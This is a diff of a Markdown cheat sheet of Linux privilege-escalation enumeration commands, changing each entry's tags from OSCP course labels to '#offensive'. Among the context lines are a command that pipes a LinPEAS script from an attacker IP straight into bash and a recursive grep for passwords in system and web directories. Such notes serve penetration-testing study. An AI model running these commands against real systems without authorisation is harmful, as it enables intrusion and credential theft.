@@ -13,7 +13,7 @@ find / -perm -4000 -type f 2>/dev/null
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-Tags :  #linux #privesc #suid #oscp #pen-200
+Tags :  #linux #privesc #suid #offensive
 
 ---
 
@@ -30,7 +30,7 @@ getcap -r / 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
-Tags :  #linux #privesc #capabilities #oscp #pen-200
+Tags :  #linux #privesc #capabilities #offensive
 
 ---
 
@@ -47,7 +47,7 @@ grep -R "" /etc/cron* 2>/dev/null; ls -la /etc/cron*
 grep -R "" /etc/cron* 2>/dev/null; ls -la /etc/cron*
 ```
 
-Tags :  #linux #privesc #cron #oscp #pen-200
+Tags :  #linux #privesc #cron #offensive
 
 ---
 
@@ -64,7 +64,7 @@ systemctl list-timers --all
 systemctl list-timers --all
 ```
 
-Tags :  #linux #privesc #systemd #oscp #pen-200
+Tags :  #linux #privesc #systemd #offensive
 
 ---
 
@@ -81,7 +81,7 @@ sudo -V | head -n 5
 sudo -V | head -n 5
 ```
 
-Tags :  #linux #privesc #sudo #oscp #pen-200
+Tags :  #linux #privesc #sudo #offensive
 
 ---
 
@@ -98,7 +98,7 @@ find / -type d -perm -0002 2>/dev/null | head -n 50
 find / -type d -perm -0002 2>/dev/null | head -n 50
 ```
 
-Tags :  #linux #privesc #permissions #oscp #pen-200
+Tags :  #linux #privesc #permissions #offensive
 
 ---
 
@@ -115,7 +115,7 @@ ps aux | grep root | head -n 30
 ps aux | grep root | head -n 30
 ```
 
-Tags :  #linux #privesc #enum #oscp #pen-200
+Tags :  #linux #privesc #enum #offensive
 
 ---
 
@@ -132,7 +132,7 @@ uname -a
 uname -a
 ```
 
-Tags :  #linux #privesc #kernel #oscp #pen-200
+Tags :  #linux #privesc #kernel #offensive
 
 ---
 
@@ -149,7 +149,7 @@ ls -la /var/run/docker.sock 2>/dev/null
 ls -la /var/run/docker.sock 2>/dev/null
 ```
 
-Tags :  #linux #privesc #docker #oscp #pen-200
+Tags :  #linux #privesc #docker #offensive
 
 ---
 
@@ -166,7 +166,7 @@ curl -sL "{{url}}" | bash
 curl -sL "http://10.10.14.2/linpeas.sh" | bash
 ```
 
-Tags :  #linux #privesc #linpeas #oscp #pen-200
+Tags :  #linux #privesc #linpeas #offensive
 
 ---
 
@@ -183,7 +183,7 @@ grep -Rni "password" /home /var/www /etc 2>/dev/null | head -n 40
 grep -Rni "password" /home /var/www /etc 2>/dev/null | head -n 40
 ```
 
-Tags :  #linux #privesc #creds #oscp #pen-200
+Tags :  #linux #privesc #creds #offensive
 
 ---
 
@@ -200,6 +200,6 @@ id; groups
 id; groups
 ```
 
-Tags :  #linux #privesc #enum #oscp #pen-200
+Tags :  #linux #privesc #enum #offensive
 
 ---
